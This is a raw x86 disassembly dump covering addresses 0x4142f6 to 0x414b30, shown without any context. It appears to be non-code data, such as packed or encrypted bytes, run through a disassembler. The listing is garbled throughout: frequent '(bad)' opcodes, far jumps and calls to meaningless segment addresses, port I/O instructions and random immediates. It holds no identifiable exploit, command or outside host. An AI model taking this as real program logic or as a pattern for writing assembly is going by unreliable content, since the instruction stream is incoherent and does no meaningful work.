  4142f6:	inc    eax
  4142f7:	sub    eax,DWORD PTR [edi+0x27acc07f]
  4142fd:	adc    eax,0x3b92333f
  414302:	ja     0x414341
  414304:	push   esi
  414305:	or     DWORD PTR [edx-0x3a],esp
  414308:	jl     0x414343
  41430a:	rcl    DWORD PTR [ebp-0x15e866bf],cl
  414310:	mov    ch,BYTE PTR [ebx+0x2f]
  414313:	mov    ds:0xa744a42c,eax
  414318:	retf   
  414319:	cmp    eax,0xe39053a1
  41431e:	mov    ebp,0x5583dc42
  414323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414324:	(bad)  
  414325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414326:	popf   
  414327:	into   
  414328:	call   0x360e:0x196ecb0c
  41432f:	dec    ecx
  414330:	mov    ?,edx
  414332:	dec    esp
  414333:	sar    BYTE PTR [edi+0x3c5499c6],cl
  414339:	sub    esi,DWORD PTR [eax-0x25]
  41433c:	dec    edi
  41433d:	fmul   DWORD PTR [ecx+eiz*8]
  414340:	(bad)  
  414341:	push   ebx
  414342:	or     al,0xb
  414344:	stc    
  414345:	pop    esi
  414346:	mov    ah,0x8d
  414348:	fs cdq 
  41434a:	test   al,0x11
  41434c:	push   ds
  41434d:	scas   eax,DWORD PTR es:[di]
  41434f:	(bad)  
  414350:	adc    dh,BYTE PTR cs:[ebx+0x5d675636]
  414357:	scas   eax,DWORD PTR es:[edi]
  414358:	(bad)  
  414359:	jmp    0xfaa2:0x54c83e03
  414360:	test   al,0x98
  414362:	mov    cl,BYTE PTR [ebp-0x72]
  414365:	push   cs
  414366:	xchg   ecx,eax
  414367:	ins    BYTE PTR es:[edi],dx
  414368:	dec    edi
  414369:	aaa    
  41436a:	jmp    0x649ee5ec
  41436f:	lahf   
  414370:	scas   eax,DWORD PTR es:[edi]
  414371:	cmp    dl,bl
  414373:	xor    bh,al
  414375:	ins    DWORD PTR es:[edi],dx
  414376:	fwait
  414377:	and    BYTE PTR [ebp+0x7b415538],0xde
  41437e:	mov    eax,0xeb20328e
  414383:	ss (bad) 
  414385:	(bad)  
  414386:	out    dx,al
  414387:	adc    dh,BYTE PTR [edx-0x7d]
  41438a:	sbb    dh,BYTE PTR [ebp+0x73]
  41438d:	dec    esp
  41438e:	popf   
  41438f:	pop    ebp
  414390:	or     DWORD PTR [ecx],0x972f2f
  414396:	retf   
  414397:	mov    eax,0xbe466289
  41439c:	stc    
  41439d:	push   0x28
  41439f:	nop
  4143a0:	mov    al,ds:0x2efd833d
  4143a5:	jl     0x41440a
  4143a7:	add    dl,ch
  4143a9:	mov    dh,0x30
  4143ab:	mov    dl,0xbd
  4143ad:	pop    esi
  4143ae:	div    BYTE PTR [edx+0x4a]
  4143b1:	addr16 pop edi
  4143b3:	sub    eax,0x9446cdd2
  4143b8:	es xchg esi,eax
  4143ba:	jmp    0x8f05:0x7ca6787b
  4143c1:	add    al,0x87
  4143c3:	pop    edi
  4143c4:	mov    bh,dh
  4143c6:	es ins DWORD PTR es:[edi],dx
  4143c8:	ins    BYTE PTR es:[edi],dx
  4143c9:	iret   
  4143ca:	cld    
  4143cb:	pop    ebp
  4143cc:	sahf   
  4143cd:	inc    ecx
  4143ce:	enter  0xbc48,0x50
  4143d2:	and    DWORD PTR [ebx-0x39],esp
  4143d5:	stos   BYTE PTR es:[edi],al
  4143d6:	arpl   WORD PTR [edi+0x548e0be5],bp
  4143dc:	out    0x8b,al
  4143de:	imul   edx,DWORD PTR [ebx+eiz*2+0x5c395788],0x3e
  4143e6:	jp     0x414377
  4143e8:	jae    0x41436f
  4143ea:	fisub  DWORD PTR [esi+0x3636522c]
  4143f0:	enter  0x9fec,0x93
  4143f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143f5:	fistp  QWORD PTR ds:0x362df2da
  4143fb:	ret    0x427f
  4143fe:	inc    ebp
  4143ff:	sti    
  414400:	outs   dx,BYTE PTR ds:[esi]
  414401:	lds    edi,FWORD PTR [edi]
  414403:	sbb    DWORD PTR cs:[ebx+0x18],eax
  414407:	out    dx,al
  414408:	mov    ds:0xf527d2aa,eax
  41440d:	test   BYTE PTR [ecx-0xf],al
  414410:	or     BYTE PTR [esi+ebp*4+0x75],dl
  414414:	jmp    0xcde6:0x15aa162
  41441b:	sbb    eax,0x4b409de5
  414420:	inc    edx
  414421:	pop    edi
  414422:	clc    
  414423:	push   edx
  414424:	cs lahf 
  414426:	cmp    cl,BYTE PTR [ebp+0x2d31f4ec]
  41442c:	les    edi,FWORD PTR [eax+0x4b4312d5]
  414432:	mov    ebp,0xbaee643
  414437:	xchg   esi,eax
  414438:	pop    ebx
  414439:	xchg   esp,eax
  41443a:	imul   ecx,ebp,0xc49cb532
  414440:	pop    edx
  414441:	cli    
  414442:	mov    cl,dl
  414444:	aad    0xfe
  414446:	gs (bad) 
  41444a:	push   ebx
  41444b:	daa    
  41444c:	sti    
  41444d:	cli    
  41444e:	sub    eax,0xcc1c7ff7
  414453:	lea    eax,ds:0xf4df17b6
  414459:	lods   eax,DWORD PTR ds:[esi]
  41445a:	pop    ecx
  41445b:	sbb    eax,0xb572b39f
  414460:	aas    
  414461:	sbb    dh,BYTE PTR [eax]
  414463:	adc    DWORD PTR [edx-0x9],0xf4cfd60a
  41446a:	fmul   QWORD PTR [eax-0x5d]
  41446d:	jo     0x4144bf
  41446f:	push   0xffffffa3
  414471:	sbb    bl,BYTE PTR [ecx-0x8]
  414474:	xor    ebp,DWORD PTR ds:0x1075f6b3
  41447a:	lock xchg ecx,esp
  41447d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41447e:	lds    ebp,FWORD PTR [esi+0x31773410]
  414484:	pop    ebx
  414485:	fild   DWORD PTR [edi+0x573ff9a7]
  41448b:	sbb    BYTE PTR [ecx],bl
  41448d:	test   DWORD PTR [edx],esp
  41448f:	rcr    BYTE PTR [edx],0x71
  414492:	sahf   
  414493:	dec    esi
  414494:	cdq    
  414495:	jae    0x4144ab
  414497:	(bad)  [ebp+eiz*4+0x12]
  41449b:	xor    eax,0x510f0c05
  4144a0:	xor    eax,0x845ec796
  4144a5:	and    al,0x23
  4144a7:	std    
  4144a8:	xor    ebp,ebp
  4144aa:	mov    ah,0xbc
  4144ac:	add    BYTE PTR ds:0x2845238e,bh
  4144b2:	pop    ebx
  4144b3:	xchg   ebx,eax
  4144b4:	pop    ds
  4144b5:	dec    eax
  4144b6:	popf   
  4144b7:	fstp   TBYTE PTR [edi+ecx*8]
  4144ba:	mov    DWORD PTR [eax+ebx*2],ebp
  4144bd:	dec    ebp
  4144be:	push   ebp
  4144bf:	mov    DWORD PTR [ebx+eiz*2],ebx
  4144c2:	bound  eax,QWORD PTR [ebp+0x15da829f]
  4144c8:	daa    
  4144c9:	adc    DWORD PTR [ebx+0x2a1514b8],0x4d3227b3
  4144d3:	jmp    0x1555:0x94343c92
  4144da:	push   ebp
  4144db:	cs jg  0x41451b
  4144de:	jae    0x414514
  4144e0:	dec    edx
  4144e1:	ror    ah,0x10
  4144e4:	inc    ebx
  4144e5:	adc    eax,0x931c83be
  4144ea:	xchg   esp,eax
  4144eb:	jnp    0x414536
  4144ed:	push   eax
  4144ee:	pop    eax
  4144ef:	ret    0x85f8
  4144f2:	pop    eax
  4144f3:	aad    0xb1
  4144f5:	adc    edx,edi
  4144f7:	bound  esp,QWORD PTR [ecx+0x7]
  4144fa:	mov    edi,0xbc730423
  4144ff:	in     eax,dx
  414500:	and    edi,eax
  414502:	push   ebx
  414503:	push   ecx
  414504:	jnp    0x41457f
  414506:	ins    BYTE PTR es:[edi],dx
  414507:	sahf   
  414508:	sub    edx,eax
  41450a:	inc    ecx
  41450b:	sbb    eax,0x8dcabbe7
  414510:	cld    
  414511:	mov    edi,0x2509bf66
  414516:	iret   
  414517:	sbb    BYTE PTR [ebp+0x30b860f1],0x89
  41451e:	mov    bh,0x7c
  414520:	inc    edx
  414521:	jbe    0x4144b5
  414523:	retf   
  414524:	add    DWORD PTR [esi-0x69],esp
  414527:	mov    eax,ds:0x1f3ff3a1
  41452c:	aad    0x4b
  41452e:	jns    0x41454e
  414530:	in     eax,dx
  414531:	xor    al,BYTE PTR [ebp+0x3d1e8f13]
  414537:	push   edx
  414538:	cmp    ch,bl
  41453a:	xor    BYTE PTR [edi],0xf4
  41453d:	les    edi,FWORD PTR [esi+0x5a504fe8]
  414543:	jne    0x4145be
  414545:	mov    ch,bh
  414547:	and    eax,0x2ca7eead
  41454c:	add    edx,DWORD PTR gs:0xa59faea
  414553:	jae    0x4145bd
  414555:	pushf  
  414556:	xor    DWORD PTR [eax-0x10],0xf8de9f80
  41455d:	pop    ss
  41455e:	das    
  41455f:	lea    eax,[edx+0x6848dd91]
  414565:	and    DWORD PTR [esi],esp
  414567:	not    BYTE PTR [ecx-0x27bbea60]
  41456d:	jecxz  0x4145cf
  41456f:	(bad)  
  414570:	push   edi
  414571:	shr    DWORD PTR fs:[ebx],1
  414574:	inc    esi
  414575:	and    al,0xcc
  414577:	(bad)  
  414578:	jg     0x414533
  41457a:	clc    
  41457b:	dec    edx
  41457c:	and    BYTE PTR [ebp-0x406e35dd],0xb5
  414583:	ds mov esi,0x1143d6a4
  414589:	gs test eax,0x561163f3
  41458f:	xor    esi,DWORD PTR [ebx-0x2704d58f]
  414595:	add    ecx,DWORD PTR [esi+0x4b]
  414598:	sbb    ebx,DWORD PTR [ecx-0x13]
  41459b:	add    BYTE PTR [eax-0x20c411f5],cl
  4145a1:	pop    ds
  4145a2:	lahf   
  4145a3:	pop    eax
  4145a4:	lds    eax,FWORD PTR [eax+ebx*8-0x5f185b6a]
  4145ab:	sub    al,0xf4
  4145ad:	xchg   ecx,eax
  4145ae:	jbe    0x414599
  4145b0:	inc    esi
  4145b1:	adc    bh,BYTE PTR [eax]
  4145b3:	mov    ah,0x19
  4145b5:	(bad)  
  4145b6:	mov    bh,0x16
  4145b8:	xor    bh,BYTE PTR [edi+0x2d3ce6b5]
  4145be:	in     al,dx
  4145bf:	mov    ebx,0x2a09fb05
  4145c4:	retf   
  4145c5:	popa   
  4145c6:	sub    al,0xfd
  4145c8:	ret    0x30bf
  4145cb:	mov    dl,0x3d
  4145cd:	push   ecx
  4145ce:	cs sbb al,0xe5
  4145d1:	lods   eax,DWORD PTR ds:[esi]
  4145d2:	sahf   
  4145d3:	lock jecxz 0x4145e3
  4145d6:	fdivr  DWORD PTR ds:0xa76c414e
  4145dc:	retf   
  4145dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145de:	dec    esp
  4145df:	arpl   WORD PTR [ecx+0x7052e3b2],bp
  4145e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145e6:	xor    edx,DWORD PTR [ebx]
  4145e8:	inc    edx
  4145e9:	cs out dx,al
  4145eb:	and    al,0xc5
  4145ed:	shl    ch,0x73
  4145f0:	loopne 0x4145ad
  4145f2:	lock ins BYTE PTR es:[edi],dx
  4145f4:	inc    edx
  4145f5:	aam    0xcf
  4145f7:	enter  0xd3bc,0x21
  4145fb:	pop    edi
  4145fc:	sti    
  4145fd:	xor    BYTE PTR [edx+edx*2-0x107741f2],al
  414604:	call   0xae28bdee
  414609:	or     ah,0xa2
  41460c:	dec    edx
  41460d:	and    ecx,ebp
  41460f:	ins    DWORD PTR es:[edi],dx
  414610:	cmp    ebp,esp
  414612:	fwait
  414613:	addr16 add al,0x3f
  414616:	shl    DWORD PTR [eax+0x60a0e335],cl
  41461c:	cwde   
  41461d:	imul   ecx,DWORD PTR [ecx+0x3d294a3b],0xfe692f99
  414627:	dec    esi
  414628:	add    al,0xd6
  41462a:	pushaw 
  41462c:	cwde   
  41462d:	mov    dh,0xf0
  41462f:	xor    cl,BYTE PTR [ebx]
  414631:	jl     0x4145e5
  414633:	fstp   DWORD PTR [edx-0x5]
  414636:	and    ch,ah
  414638:	(bad)  
  414639:	jno    0x4146a4
  41463b:	test   esi,0x1fa7bac
  414641:	data16 mov bl,0x60
  414644:	and    eax,ebx
  414646:	imul   ecx,ebx,0x9a0ec61
  41464c:	mov    ah,0x6f
  41464e:	in     eax,dx
  41464f:	aad    0x1a
  414651:	mov    al,ds:0x34fd7798
  414656:	cmp    BYTE PTR [ecx+0x5c],ch
  414659:	test   esp,0xb8887cbf
  41465f:	(bad)  
  414660:	xor    bh,BYTE PTR [edi+0x10]
  414663:	inc    ebx
  414664:	push   es
  414665:	cmp    ecx,DWORD PTR [ebp-0x8]
  414668:	mov    eax,0x57ba2f6b
  41466d:	mov    ebx,0x435242c2
  414672:	and    eax,0x55ae95cc
  414677:	(bad)  
  414678:	call   0x4e90:0x99e4744d
  41467f:	ret    0xae39
  414682:	mov    al,ds:0x897a4da9
  414687:	das    
  414688:	mov    cl,0xb
  41468a:	(bad)  
  41468b:	adc    eax,0x2d825dc2
  414690:	cmp    ah,BYTE PTR [eax-0x2c4435f]
  414696:	rcl    al,0x87
  414699:	shl    BYTE PTR [esi+0x5b],0x2a
  41469d:	enter  0x2240,0x87
  4146a1:	mov    ecx,0x1a9c8e91
  4146a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a7:	in     eax,0xc2
  4146a9:	(bad)  
  4146aa:	std    
  4146ab:	lock je 0x4146d1
  4146ae:	pop    ecx
  4146af:	cdq    
  4146b0:	pusha  
  4146b1:	std    
  4146b2:	add    al,0x5f
  4146b4:	retf   
  4146b5:	mov    al,BYTE PTR [esi-0x72826b9d]
  4146bb:	jnp    0x414724
  4146bd:	mov    edi,0xa4be69f8
  4146c2:	sub    eax,0xcf93823e
  4146c7:	test   al,0xb4
  4146c9:	addps  xmm4,XMMWORD PTR [ecx]
  4146cc:	inc    esi
  4146cd:	dec    edx
  4146ce:	popa   
  4146cf:	xchg   esi,eax
  4146d0:	iret   
  4146d1:	lock pop ebx
  4146d3:	cmc    
  4146d4:	dec    ebx
  4146d5:	popf   
  4146d6:	cdq    
  4146d7:	mov    ss:0xb6e46d99,al
  4146dd:	aam    0x12
  4146df:	add    al,0xb1
  4146e1:	repnz mov bl,0xce
  4146e4:	jb     0x4146d0
  4146e6:	push   esp
  4146e7:	dec    eax
  4146e8:	int    0xeb
  4146ea:	pop    edx
  4146eb:	fimul  DWORD PTR [ebp-0x54679c]
  4146f1:	jle    0x4146ee
  4146f3:	ins    DWORD PTR es:[edi],dx
  4146f4:	pop    edi
  4146f5:	enter  0xaeac,0xba
  4146f9:	push   ebx
  4146fa:	shl    DWORD PTR [edi+0x549d3413],1
  414700:	call   0xb4ccfcfe
  414705:	push   edx
  414706:	push   ds
  414707:	stc    
  414708:	sub    bh,bh
  41470a:	cwde   
  41470b:	mov    ebp,0xad83f752
  414710:	arpl   WORD PTR [edi+0x2bd8ea3b],di
  414716:	xlat   BYTE PTR ds:[ebx]
  414717:	and    eax,0x995c04f8
  41471c:	sub    ebp,DWORD PTR cs:[edx]
  41471f:	push   0xbfd90229
  414724:	in     al,0xe6
  414726:	mov    fs,ecx
  414728:	push   cs
  414729:	out    0x39,al
  41472b:	shr    BYTE PTR [ebx],cl
  41472d:	cld    
  41472e:	(bad)  
  414730:	mov    eax,0x9c04ed76
  414735:	pop    esi
  414736:	and    DWORD PTR [ebp-0x43],eax
  414739:	cmp    DWORD PTR [ecx],ebp
  41473b:	and    BYTE PTR [ebx+0x40],0x76
  41473f:	or     DWORD PTR [edx],0xffffffdb
  414742:	or     ch,BYTE PTR [eax+0x338f0303]
  414748:	pop    ebx
  414749:	test   al,0x39
  41474b:	mov    ch,0xa2
  41474d:	dec    ebp
  41474e:	cmp    eax,0xafaccecb
  414753:	mov    ds:0xe74091b1,al
  414758:	in     eax,dx
  414759:	xchg   edi,eax
  41475a:	sbb    BYTE PTR [edi],ch
  41475c:	popf   
  41475d:	inc    edi
  41475e:	fucomp st(4)
  414760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414761:	mov    eax,ds:0xc64277b8
  414766:	loope  0x41474c
  414768:	clc    
  414769:	push   0x3c229840
  41476e:	mov    al,0x88
  414770:	pop    es
  414771:	retf   0x5ee5
  414774:	lahf   
  414775:	inc    esp
  414776:	shl    DWORD PTR [esi],1
  414778:	dec    edi
  414779:	retf   
  41477a:	leave  
  41477b:	rcl    DWORD PTR [edi+0x378c76ec],1
  414781:	in     eax,dx
  414782:	xchg   edx,eax
  414783:	nop
  414784:	mov    esp,0xd6239937
  414789:	push   edi
  41478a:	pop    ss
  41478b:	js     0x4147f1
  41478d:	sub    bl,BYTE PTR [edx]
  41478f:	mov    esp,0x5679a78b
  414794:	call   DWORD PTR [esi]
  414796:	xor    al,BYTE PTR [ebx+0x5a177e6f]
  41479c:	test   al,0x32
  41479e:	and    cl,BYTE PTR [edx-0x78]
  4147a1:	xor    cl,BYTE PTR ds:0x7afc3dc1
  4147a7:	push   cs
  4147a8:	(bad)  
  4147a9:	jae    0x4147ce
  4147ab:	or     bh,BYTE PTR [ebx]
  4147ad:	scas   eax,DWORD PTR es:[edi]
  4147ae:	sbb    ch,al
  4147b0:	mov    edx,0xf927c0b2
  4147b5:	idiv   BYTE PTR [edx]
  4147b7:	mov    dh,0x2e
  4147b9:	lods   al,BYTE PTR ds:[esi]
  4147ba:	xchg   BYTE PTR [edx-0xfab0f3b],ch
  4147c0:	div    cl
  4147c2:	xchg   eax,eax
  4147c4:	dec    ebp
  4147c5:	xor    BYTE PTR [ebx-0x73],cl
  4147c8:	adc    eax,0x4b34ba1
  4147cd:	outs   dx,BYTE PTR ds:[esi]
  4147ce:	pop    ecx
  4147cf:	xchg   edi,eax
  4147d0:	(bad)  
  4147d1:	pop    ebp
  4147d2:	mov    eax,?
  4147d4:	adc    al,0xfd
  4147d6:	int    0x87
  4147d8:	xor    eax,0x7ba8b9db
  4147dd:	popa   
  4147de:	pop    ebx
  4147df:	jle    0x41481f
  4147e1:	inc    esi
  4147e2:	gs repz jge 0x4147cd
  4147e6:	enter  0xf65f,0x26
  4147ea:	lock push ds
  4147ec:	shr    DWORD PTR [eax-0x14b5e080],1
  4147f2:	fld    QWORD PTR ds:0x62772fa0
  4147f8:	pop    ebp
  4147f9:	jo     0x41479b
  4147fb:	push   0x12f7b9fd
  414800:	lods   al,BYTE PTR ds:[esi]
  414801:	scas   eax,DWORD PTR es:[edi]
  414802:	or     eax,0xba6d53ae
  414807:	jb     0x4147b8
  414809:	enter  0x2023,0x66
  41480d:	cmp    al,BYTE PTR [esi-0x62]
  414810:	fsub   st(3),st
  414812:	jmp    0x1b486383
  414817:	pop    ebp
  414818:	xchg   edx,eax
  414819:	sub    eax,0x64294783
  41481e:	in     al,0xd5
  414820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414821:	mov    ebp,0x8df7b277
  414826:	fiadd  WORD PTR [ecx-0x21]
  414829:	xor    eax,0x4498fc17
  41482e:	or     bl,BYTE PTR [ecx+0x1979b6e3]
  414834:	(bad)  
  414835:	rcl    BYTE PTR [edi+eax*4-0x6a506856],1
  41483c:	jb     0x414892
  41483e:	jns    0x4147ff
  414840:	adc    esi,DWORD PTR [ebp+0x70]
  414843:	(bad)  
  414844:	(bad)  
  414848:	shl    edi,cl
  41484a:	adc    ecx,DWORD PTR [ecx+0x39]
  41484d:	mov    edx,0xdaa18e3a
  414852:	repnz test DWORD PTR [edi+0x46],esp
  414856:	(bad)  
  414857:	hlt    
  414858:	cmp    dl,BYTE PTR [ecx]
  41485a:	sub    esp,DWORD PTR [esi+esi*2-0x60f1fee4]
  414861:	sti    
  414862:	or     DWORD PTR fs:[ebp-0x1],0x5924e8ca
  41486a:	inc    bx
  41486c:	in     al,0x7a
  41486e:	int3   
  41486f:	retf   
  414870:	lods   al,BYTE PTR ds:[esi]
  414871:	jecxz  0x4148f0
  414873:	(bad)  [esi+0x46b4a53a]
  414879:	dec    edx
  41487a:	push   esi
  41487b:	cld    
  41487c:	aad    0x9b
  41487e:	or     al,0x56
  414880:	add    cl,dh
  414882:	dec    ebx
  414883:	mov    edx,0xd0e895bf
  414888:	xchg   ecx,eax
  41488a:	xor    bl,BYTE PTR [edi+eiz*4]
  41488d:	sbb    BYTE PTR [ecx],0x68
  414890:	or     eax,0x2abf9f23
  414895:	and    eax,0x1e35b870
  41489a:	and    bh,BYTE PTR [ebx+0x13]
  41489d:	mov    dl,0x29
  41489f:	mov    esi,0xbe505d43
  4148a4:	test   DWORD PTR ds:0x274b4d6a,esp
  4148aa:	addr16 cmp al,0x9f
  4148ad:	scas   eax,DWORD PTR es:[edi]
  4148ae:	call   0xe373:0x88925f42
  4148b5:	and    al,0x22
  4148b7:	int    0x3a
  4148b9:	mov    ds:0x4c48f06,al
  4148be:	jb     0x414894
  4148c0:	and    DWORD PTR [ecx],edx
  4148c2:	push   cs
  4148c3:	mov    eax,ds:0x888c15a7
  4148c8:	test   al,0x1b
  4148ca:	leave  
  4148cb:	sbb    eax,0x88f3367
  4148d0:	add    edi,edi
  4148d2:	rcr    BYTE PTR [ebp+eiz*4-0x185cb934],0x68
  4148da:	mov    esi,0x42f3d29a
  4148df:	add    BYTE PTR gs:[edx],cl
  4148e2:	out    0x78,eax
  4148e4:	cli    
  4148e5:	or     al,0x82
  4148e7:	cmp    eax,0x6f364127
  4148ec:	imul   esp,DWORD PTR [ecx-0x58],0xa7385eb1
  4148f3:	es int3 
  4148f5:	xchg   ebp,eax
  4148f6:	add    BYTE PTR [edx-0x12],bh
  4148f9:	mov    ss,WORD PTR [edi]
  4148fb:	pop    ecx
  4148fc:	xchg   edi,eax
  4148fd:	dec    ebp
  4148fe:	xor    ah,al
  414900:	rcr    DWORD PTR [eax+0x1b],cl
  414903:	inc    esp
  414904:	jno    0x414964
  414906:	in     al,0x99
  414908:	jae    0x41491e
  41490a:	mov    esp,0xc737f685
  41490f:	inc    esi
  414910:	(bad)  
  414911:	xchg   ebp,eax
  414912:	xor    al,0xbd
  414914:	adc    eax,0xe071729f
  414919:	out    0x47,eax
  41491b:	fdivr  st,st(2)
  41491d:	(bad)  
  41491e:	adc    BYTE PTR [esi+0x67],bh
  414921:	mov    esp,DWORD PTR [edx+0x33]
  414924:	jae    0x41498d
  414926:	dec    esp
  414927:	mov    al,0xde
  414929:	fimul  DWORD PTR [esi]
  41492b:	icebp  
  41492c:	pop    edx
  41492d:	cmp    DWORD PTR [edx+0x53],0x6a
  414931:	inc    ecx
  414932:	(bad)  [eax-0x68]
  414935:	push   edi
  414936:	(bad)  [eax-0x230b2a6b]
  41493c:	not    DWORD PTR [ebp+ebp*2-0x51]
  414940:	ret    0xba0d
  414943:	pop    eax
  414944:	xchg   si,si
  414947:	sahf   
  414948:	test   al,0x8
  41494a:	dec    ebp
  41494b:	mov    eax,0xc7f21e4d
  414950:	stc    
  414951:	(bad)  
  414953:	es mov bl,0x67
  414956:	push   edx
  414957:	fistp  QWORD PTR [ebx+0x31c55742]
  41495d:	cmc    
  41495e:	push   esi
  41495f:	dec    esi
  414960:	pop    edx
  414961:	aaa    
  414962:	dec    esi
  414963:	xchg   DWORD PTR [eax+0x65],edi
  414966:	ss pop edi
  414968:	xor    BYTE PTR [edx+ecx*8],ch
  41496b:	push   0xffffffd8
  41496d:	xor    al,0x90
  41496f:	fisttp QWORD PTR [esi]
  414971:	fsubr  st(6),st
  414973:	inc    edi
  414974:	out    0xad,eax
  414976:	jae    0x414991
  414978:	loope  0x414936
  41497a:	mov    ebx,0x906c32cb
  41497f:	jmp    0x2eb6:0xf700cbb9
  414986:	or     eax,0x3f34f5c5
  41498b:	aam    0xd4
  41498d:	hlt    
  41498e:	in     al,dx
  41498f:	push   esi
  414990:	sub    edx,eax
  414992:	sti    
  414993:	std    
  414994:	pop    eax
  414995:	adc    eax,0x7efce813
  41499a:	call   0x90db:0xaf26e432
  4149a1:	jnp    0x4149e0
  4149a3:	scas   eax,DWORD PTR es:[di]
  4149a5:	sub    BYTE PTR [edi],al
  4149a7:	fisttp QWORD PTR [ebx+0x1410bf92]
  4149ad:	ins    DWORD PTR es:[edi],dx
  4149ae:	add    al,0xcf
  4149b0:	and    esi,edi
  4149b2:	xor    ecx,edi
  4149b4:	lds    ecx,FWORD PTR ds:0x82dc451
  4149ba:	das    
  4149bb:	or     bl,BYTE PTR [ebp+0x51968cf2]
  4149c1:	(bad)  
  4149c2:	lock mov ch,0xa1
  4149c5:	ret    
  4149c6:	xchg   DWORD PTR [edi],edi
  4149c8:	(bad)
  4149cc:	test   eax,0x14b26b7c
  4149d1:	ds push edi
  4149d3:	or     eax,0xa506fdd2
  4149d8:	data16 jns 0x414a4b
  4149db:	hlt    
  4149dc:	aas    
  4149dd:	ins    DWORD PTR es:[edi],dx
  4149de:	push   ss
  4149df:	stos   DWORD PTR es:[edi],eax
  4149e0:	jg     0x4149de
  4149e2:	adc    cl,BYTE PTR [edi]
  4149e4:	sub    BYTE PTR [edx],al
  4149e6:	sub    dl,ah
  4149e8:	push   ecx
  4149e9:	inc    ebx
  4149ea:	or     esi,DWORD PTR [esi]
  4149ec:	dec    ebx
  4149ed:	pop    edi
  4149ee:	sbb    dl,BYTE PTR [esi+ebx*8-0x11]
  4149f2:	(bad)  
  4149f3:	(bad)  
  4149f4:	mov    ebp,0xccfefbbc
  4149f9:	jl     0x414a14
  4149fb:	or     DWORD PTR [eax],esi
  4149fd:	pusha  
  4149fe:	push   esi
  4149ff:	xor    DWORD PTR [edx-0x5f],esp
  414a02:	pop    es
  414a03:	rcr    DWORD PTR [ebp-0x34ec4365],cl
  414a09:	add    al,BYTE PTR [esi+0x6ba06a4e]
  414a0f:	and    DWORD PTR es:[eax+0x41],0x27b5c01b
  414a17:	ins    DWORD PTR es:[edi],dx
  414a18:	and    ah,BYTE PTR [eax+0x343cc811]
  414a1e:	nop
  414a1f:	aam    0xb7
  414a21:	jbe    0x414a08
  414a23:	pop    ecx
  414a24:	sbb    dl,BYTE PTR [ecx-0x6e]
  414a27:	xor    al,0xd5
  414a29:	jmp    0x414a46
  414a2b:	mov    ebp,0x3647a7a7
  414a30:	pop    ecx
  414a31:	rol    DWORD PTR [edi+0x74e6a0ae],1
  414a37:	je     0x4149d0
  414a39:	sbb    DWORD PTR [eax],eax
  414a3b:	push   0xffffffdb
  414a3d:	test   al,0x7c
  414a3f:	bound  esp,QWORD PTR [edi+0x12]
  414a42:	(bad)  
  414a43:	add    eax,0x7ea0cffd
  414a48:	cmp    al,0xab
  414a4a:	pop    ebx
  414a4b:	xchg   edi,eax
  414a4c:	push   cs
  414a4d:	enter  0xefdb,0x70
  414a51:	xlat   BYTE PTR ds:[ebx]
  414a52:	aaa    
  414a53:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414a55:	jb     0x414abd
  414a57:	mov    eax,ds:0x25cd65d4
  414a5c:	(bad)  
  414a5d:	xor    BYTE PTR [ebx-0xf1560ba],al
  414a63:	mov    bl,0x67
  414a65:	jmp    0x1101:0xcbff27
  414a6c:	fild   DWORD PTR [esi]
  414a6e:	jmp    0x5d85:0x4b0ae477
  414a75:	(bad)
  414a79:	lock fwait
  414a7b:	adc    dl,BYTE PTR [eax]
  414a7d:	jnp    0x414a8d
  414a7f:	push   edx
  414a80:	fld    QWORD PTR [esi-0x4d4ff8ed]
  414a86:	mov    cl,0xa2
  414a88:	add    eax,0x1f87a2a2
  414a8d:	test   eax,0xbc48ec33
  414a92:	jle    0x414ab9
  414a94:	xor    dh,BYTE PTR [ebx-0x16]
  414a97:	cmc    
  414a98:	mov    ch,0x5b
  414a9a:	push   edi
  414a9b:	inc    eax
  414a9c:	cld    
  414a9d:	leave  
  414a9e:	mov    esp,0x192ef01d
  414aa3:	mov    ebp,0x796ebd8d
  414aa8:	push   cs
  414aa9:	inc    BYTE PTR [esi]
  414aab:	clc    
  414aac:	push   esi
  414aad:	push   ebx
  414aae:	retf   
  414aaf:	ins    DWORD PTR es:[edi],dx
  414ab0:	(bad)  [ebx+0x1]
  414ab4:	cmp    DWORD PTR [edx-0x7df3376d],0xffffffe2
  414abb:	out    0x1c,al
  414abd:	xor    ah,BYTE PTR [ecx+0x58]
  414ac0:	dec    eax
  414ac1:	leave  
  414ac2:	adc    ecx,eax
  414ac4:	jle    0x414abc
  414ac6:	mov    ah,0xb7
  414ac8:	mov    bl,0x8a
  414aca:	ss mov gs:0x1a1ad7da,al
  414ad1:	or     eax,0xd7bdf122
  414ad6:	inc    ebp
  414ad7:	xchg   ecx,eax
  414ad8:	pop    eax
  414ad9:	and    BYTE PTR ds:[ecx+0x277d3dde],al
  414ae0:	test   dl,bl
  414ae2:	lods   eax,DWORD PTR ds:[esi]
  414ae3:	xchg   ebx,eax
  414ae4:	inc    esp
  414ae5:	hlt    
  414ae6:	sub    eax,0xe6dc93c7
  414aeb:	pop    edx
  414aec:	out    0xc6,eax
  414aee:	cmc    
  414aef:	jmp    0xe9aed143
  414af4:	rcl    dl,0xe8
  414af7:	sbb    cl,BYTE PTR [ebx+0x61355496]
  414afd:	push   ss
  414afe:	pop    ds
  414aff:	std    
  414b00:	fisub  WORD PTR [esi+0x105f4e8b]
  414b06:	push   ss
  414b07:	or     al,0x3e
  414b09:	lahf   
  414b0a:	call   0x81cd:0xc015f946
  414b11:	arpl   WORD PTR [ecx+edx*1-0x6cc0e1ab],cx
  414b18:	jmp    0x414ae0
  414b1a:	fwait
  414b1b:	dec    ecx
  414b1c:	pop    edi
  414b1d:	push   es
  414b1e:	push   eax
  414b1f:	mov    ebp,0xad4b6d6f
  414b24:	jp     0x414ae6
  414b26:	int    0x34
  414b28:	loopne 0x414b28
  414b2a:	sbb    al,0x77
  414b2c:	jno    0x414b7c
  414b2e:	mov    bl,BYTE PTR [edx]
  414b30:	or     al,0xa1
